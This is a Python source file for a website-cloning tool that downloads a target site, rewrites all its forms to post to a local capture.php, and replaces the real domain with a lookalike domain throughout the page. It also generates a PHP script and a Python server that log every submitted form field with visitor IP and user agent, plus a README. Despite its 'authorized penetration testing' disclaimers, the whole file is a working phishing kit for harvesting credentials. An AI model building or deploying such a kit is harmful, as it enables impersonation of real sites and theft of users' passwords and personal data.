import os
import re
import requests
from urllib.parse import urljoin, urlparse, parse_qs
from pathlib import Path
from bs4 import BeautifulSoup
import time
import mimetypes

class WebScraper:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        self.downloaded_assets = set()
        self.base_url = None
        self.target_domain = None
    
    def normalize_url(self, url):
        if url.startswith('//'):
            return f"https:{url}"
        elif url.startswith('/'):
            return urljoin(self.base_url, url)
        elif not url.startswith(('http://', 'https://')):
            return urljoin(self.base_url, url)
        return url
    
    def download_asset(self, url, output_dir):
        try:
            normalized_url = self.normalize_url(url)
            
            # Skip if already downloaded
            if normalized_url in self.downloaded_assets:
                return self.get_local_path(normalized_url, output_dir)
            
            print(f"Downloading: {normalized_url}")
            response = self.session.get(normalized_url, timeout=15, stream=True)
            response.raise_for_status()
            
            parsed_url = urlparse(normalized_url)
            local_path = self.get_local_path(normalized_url, output_dir)
            
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            
            with open(local_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:  # filter out keep-alive chunks
                        f.write(chunk)
            
            self.downloaded_assets.add(normalized_url)
            print(f"✓ Downloaded: {os.path.basename(local_path)}")
            return local_path
            
        except requests.exceptions.RequestException as e:
            print(f"✗ Failed to download {url}: {e}")
            return None
        except Exception as e:
            print(f"✗ Error downloading {url}: {e}")
            return None
    
    def get_local_path(self, url, output_dir):
        parsed_url = urlparse(url)
        path = parsed_url.path.lstrip('/')
        
        if not path or path.endswith('/'):
            path += 'index.html'
        
        if '.' not in os.path.basename(path):
            path += '.html'
        
        return os.path.join(output_dir, 'assets', path)
    
    def get_relative_path(self, url, output_dir):
        local_path = self.get_local_path(url, output_dir)
        return os.path.relpath(local_path, output_dir)
    
    def modify_html_content(self, soup, output_dir, lookalike_domain=None):
        # Download and replace CSS files (and process their contents)
        for link in soup.find_all('link', {'rel': 'stylesheet'}):
            if link.get('href'):
                css_url = self.normalize_url(link['href'])
                local_path = self.download_asset(link['href'], output_dir)
                if local_path:
                    # Process CSS file to download referenced assets
                    try:
                        with open(local_path, 'r', encoding='utf-8') as f:
                            css_content = f.read()
                        
                        # Download assets referenced in CSS and update paths
                        processed_css = self.download_css_assets(css_content, css_url, output_dir)
                        
                        # Write back the processed CSS
                        with open(local_path, 'w', encoding='utf-8') as f:
                            f.write(processed_css)
                            
                    except Exception as e:
                        print(f"Warning: Could not process CSS file {local_path}: {e}")
                    
                    link['href'] = self.get_relative_path(link['href'], output_dir)
        
        # Download and replace JavaScript files
        for script in soup.find_all('script', src=True):
            local_path = self.download_asset(script['src'], output_dir)
            if local_path:
                script['src'] = self.get_relative_path(script['src'], output_dir)
        
        # Download and replace images
        for img in soup.find_all('img', src=True):
            local_path = self.download_asset(img['src'], output_dir)
            if local_path:
                img['src'] = self.get_relative_path(img['src'], output_dir)
        
        # Handle srcset attributes for responsive images
        for img in soup.find_all('img', srcset=True):
            srcset = img['srcset']
            new_srcset_parts = []
            for part in srcset.split(','):
                url_part = part.strip().split()[0]
                local_path = self.download_asset(url_part, output_dir)
                if local_path:
                    relative_path = self.get_relative_path(url_part, output_dir)
                    new_srcset_parts.append(part.replace(url_part, relative_path))
                else:
                    new_srcset_parts.append(part)
            img['srcset'] = ', '.join(new_srcset_parts)
        
        # Download video sources
        for video in soup.find_all('video'):
            if video.get('src'):
                local_path = self.download_asset(video['src'], output_dir)
                if local_path:
                    video['src'] = self.get_relative_path(video['src'], output_dir)
            
            for source in video.find_all('source', src=True):
                local_path = self.download_asset(source['src'], output_dir)
                if local_path:
                    source['src'] = self.get_relative_path(source['src'], output_dir)
        
        # Download audio sources
        for audio in soup.find_all('audio'):
            if audio.get('src'):
                local_path = self.download_asset(audio['src'], output_dir)
                if local_path:
                    audio['src'] = self.get_relative_path(audio['src'], output_dir)
            
            for source in audio.find_all('source', src=True):
                local_path = self.download_asset(source['src'], output_dir)
                if local_path:
                    source['src'] = self.get_relative_path(source['src'], output_dir)
        
        # Download favicon and other link rel assets
        for link in soup.find_all('link', href=True):
            rel = link.get('rel', [])
            if any(r in rel for r in ['icon', 'shortcut icon', 'apple-touch-icon', 'manifest']):
                local_path = self.download_asset(link['href'], output_dir)
                if local_path:
                    link['href'] = self.get_relative_path(link['href'], output_dir)
        
        # Handle background images in style attributes
        for element in soup.find_all(style=True):
            style = element['style']
            if 'background-image' in style or 'background:' in style:
                # Extract URLs from CSS
                url_pattern = r'url\(["\']?([^"\']+)["\']?\)'
                matches = re.findall(url_pattern, style)
                for match in matches:
                    local_path = self.download_asset(match, output_dir)
                    if local_path:
                        relative_path = self.get_relative_path(match, output_dir)
                        style = style.replace(match, relative_path)
                element['style'] = style
        
        # Modify forms to capture data (for phishing simulation)
        for form in soup.find_all('form'):
            # Store original action for reference
            original_action = form.get('action', '')
            
            # Add hidden field to track original action
            hidden_input = soup.new_tag('input')
            hidden_input['type'] = 'hidden'
            hidden_input['name'] = 'original_action'
            hidden_input['value'] = original_action
            form.append(hidden_input)
            
            # Change form action to local handler
            form['action'] = '/capture.php'
            form['method'] = 'post'
        
        # Modify links and replace domain references
        for link in soup.find_all('a', href=True):
            href = link['href']
            parsed_href = urlparse(href)
            
            # If it's an absolute URL pointing to the target domain, replace it
            if parsed_href.netloc == self.target_domain and lookalike_domain:
                link['href'] = href.replace(self.target_domain, lookalike_domain)
                print(f"Replaced link: {href} -> {link['href']}")
            # If it's an external link (not target domain), block it
            elif parsed_href.netloc and parsed_href.netloc != self.target_domain:
                link['href'] = '#'
                link['onclick'] = f"alert('External link blocked: {href}'); return false;"
        
        # Replace absolute URLs in other elements that might contain them
        if lookalike_domain:
            # Handle form actions
            for form in soup.find_all('form', action=True):
                action = form['action']
                if self.target_domain in action:
                    form['action'] = action.replace(self.target_domain, lookalike_domain)
                    print(f"Replaced form action: {action} -> {form['action']}")
            
            # Handle iframe sources
            for iframe in soup.find_all('iframe', src=True):
                src = iframe['src']
                if self.target_domain in src:
                    iframe['src'] = src.replace(self.target_domain, lookalike_domain)
                    print(f"Replaced iframe src: {src} -> {iframe['src']}")
            
            # Handle meta refresh redirects
            for meta in soup.find_all('meta', content=True):
                content = meta['content']
                if 'url=' in content and self.target_domain in content:
                    meta['content'] = content.replace(self.target_domain, lookalike_domain)
                    print(f"Replaced meta redirect: {content} -> {meta['content']}")
            
            # Handle canonical links
            for link in soup.find_all('link', rel='canonical', href=True):
                href = link['href']
                if self.target_domain in href:
                    link['href'] = href.replace(self.target_domain, lookalike_domain)
                    print(f"Replaced canonical URL: {href} -> {link['href']}")
            
            # Replace domain references in text content
            text_elements = soup.find_all(text=True)
            for element in text_elements:
                if self.target_domain in str(element):
                    new_text = str(element).replace(self.target_domain, lookalike_domain)
                    element.replace_with(new_text)
                    print(f"Replaced text: {str(element)} -> {new_text}")
            
            # Handle JavaScript URLs in onclick, onload, etc.
            for elem in soup.find_all(True):
                for attr in ['onclick', 'onload', 'onsubmit', 'href']:
                    if elem.get(attr) and self.target_domain in elem[attr]:
                        elem[attr] = elem[attr].replace(self.target_domain, lookalike_domain)
                        print(f"Replaced {attr}: {elem[attr]}")
            
            # Handle CSS background-image URLs and other CSS properties
            for element in soup.find_all(style=True):
                style = element['style']
                if self.target_domain in style:
                    element['style'] = style.replace(self.target_domain, lookalike_domain)
                    print(f"Replaced CSS style: {style} -> {element['style']}")
        
        return soup
    
    def download_css_assets(self, css_content, css_url, output_dir):
        # Find URLs in CSS content (fonts, images, other assets)
        url_pattern = r'url\(["\']?([^"\']+)["\']?\)'
        matches = re.findall(url_pattern, css_content)
        
        print(f"Found {len(matches)} asset references in CSS")
        
        for match in matches:
            try:
                # Skip data URLs
                if match.startswith('data:'):
                    continue
                    
                absolute_url = urljoin(css_url, match)
                print(f"Downloading CSS asset: {absolute_url}")
                local_path = self.download_asset(absolute_url, output_dir)
                if local_path:
                    relative_path = self.get_relative_path(absolute_url, output_dir)
                    # Replace the URL in the CSS content
                    css_content = css_content.replace(f'url({match})', f'url({relative_path})')
                    css_content = css_content.replace(f'url("{match}")', f'url("{relative_path}")')
                    css_content = css_content.replace(f"url('{match}')", f"url('{relative_path}')")
                    print(f"Replaced CSS asset: {match} -> {relative_path}")
            except Exception as e:
                print(f"Failed to download CSS asset {match}: {e}")
        
        # Also look for @import statements
        import_pattern = r'@import\s+["\']([^"\']+)["\']'
        import_matches = re.findall(import_pattern, css_content)
        
        for import_match in import_matches:
            try:
                absolute_url = urljoin(css_url, import_match)
                print(f"Downloading imported CSS: {absolute_url}")
                local_path = self.download_asset(absolute_url, output_dir)
                if local_path:
                    # Process the imported CSS file recursively
                    try:
                        with open(local_path, 'r', encoding='utf-8') as f:
                            imported_css_content = f.read()
                        
                        processed_imported_css = self.download_css_assets(imported_css_content, absolute_url, output_dir)
                        
                        with open(local_path, 'w', encoding='utf-8') as f:
                            f.write(processed_imported_css)
                    except Exception as e:
                        print(f"Warning: Could not process imported CSS {local_path}: {e}")
                    
                    relative_path = self.get_relative_path(absolute_url, output_dir)
                    css_content = css_content.replace(f'@import "{import_match}"', f'@import "{relative_path}"')
                    css_content = css_content.replace(f"@import '{import_match}'", f"@import '{relative_path}'")
                    print(f"Replaced CSS import: {import_match} -> {relative_path}")
            except Exception as e:
                print(f"Failed to download imported CSS {import_match}: {e}")
        
        return css_content
    
    def clone_website(self, target_url, output_dir, lookalike_domain=None):
        try:
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            self.base_url = target_url
            parsed_url = urlparse(target_url)
            self.target_domain = parsed_url.netloc
            
            print(f"Fetching main page: {target_url}")
            response = self.session.get(target_url, timeout=15)
            response.raise_for_status()
            
            # Create output directory
            os.makedirs(output_dir, exist_ok=True)
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Modify HTML content and download assets
            modified_soup = self.modify_html_content(soup, output_dir, lookalike_domain)
            
            # Save main HTML file
            main_html_path = os.path.join(output_dir, 'index.html')
            with open(main_html_path, 'w', encoding='utf-8') as f:
                f.write(str(modified_soup))
            
            # Create a simple capture script for form data
            self.create_capture_script(output_dir)
            
            # Create a simple web server script
            self.create_server_script(output_dir)
            
            print(f"Website cloned successfully to: {output_dir}")
            return True
            
        except Exception as e:
            print(f"Error cloning website: {e}")
            return False
    
    def create_capture_script(self, output_dir):
        capture_script = '''<?php
// Simple form data capture script for penetration testing
// WARNING: This is for authorized security testing only!

$log_file = 'captured_data.txt';
$timestamp = date('Y-m-d H:i:s');

// Log all POST data
if ($_POST) {
    $data = "\\n=== FORM SUBMISSION - $timestamp ===\\n";
    $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
    $data .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
    $data .= "Referrer: " . (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct') . "\\n";
    
    foreach ($_POST as $key => $value) {
        $data .= "$key: $value\\n";
    }
    
    $data .= "================\\n";
    
    file_put_contents($log_file, $data, FILE_APPEND | LOCK_EX);
}

// Redirect to a "success" page or back to main page
header('Location: index.html');
exit;
?>'''
        
        capture_path = os.path.join(output_dir, 'capture.php')
        with open(capture_path, 'w') as f:
            f.write(capture_script)
    
    def create_server_script(self, output_dir):
        server_script = '''#!/usr/bin/env python3
"""
Simple HTTP server for hosting cloned website
For authorized penetration testing only!
"""

import http.server
import socketserver
import os
import sys

PORT = 8080

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        # Handle form submissions
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Log the data
        with open('captured_data.txt', 'a') as f:
            f.write(f"\\n=== FORM SUBMISSION ===\\n")
            f.write(f"Data: {post_data.decode('utf-8')}\\n")
            f.write("================\\n")
        
        # Redirect back to main page
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    with socketserver.TCPServer(("", PORT), CustomHTTPRequestHandler) as httpd:
        print(f"Serving cloned website at http://localhost:{PORT}")
        print("Press Ctrl+C to stop the server")
        print("WARNING: This is for authorized security testing only!")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\\nServer stopped.")
'''
        
        server_path = os.path.join(output_dir, 'serve.py')
        with open(server_path, 'w') as f:
            f.write(server_script)
        
        # Make it executable
        os.chmod(server_path, 0o755)
        
        # Create README for the cloned site
        readme_content = '''# Cloned Website for Penetration Testing

## WARNING
This cloned website is for authorized security testing only!
Only use this in environments where you have explicit permission to conduct penetration testing.

## Files
- `index.html` - Main cloned website
- `capture.php` - PHP script to capture form submissions (requires PHP server)
- `serve.py` - Python HTTP server for testing
- `assets/` - Downloaded CSS, JS, images and other assets

## Running the Server

### Python Server (recommended for testing)
```bash
python3 serve.py
```

### PHP Server (for form capture functionality)
```bash
php -S localhost:8080
```

## Captured Data
Form submissions will be logged to `captured_data.txt`

## Legal Notice
This tool is designed for authorized penetration testing and security research only.
Users are responsible for ensuring they have proper authorization before using this tool.
Unauthorized use may violate computer fraud and abuse laws.
'''
        
        readme_path = os.path.join(output_dir, 'README.md')
        with open(readme_path, 'w') as f:
            f.write(readme_content)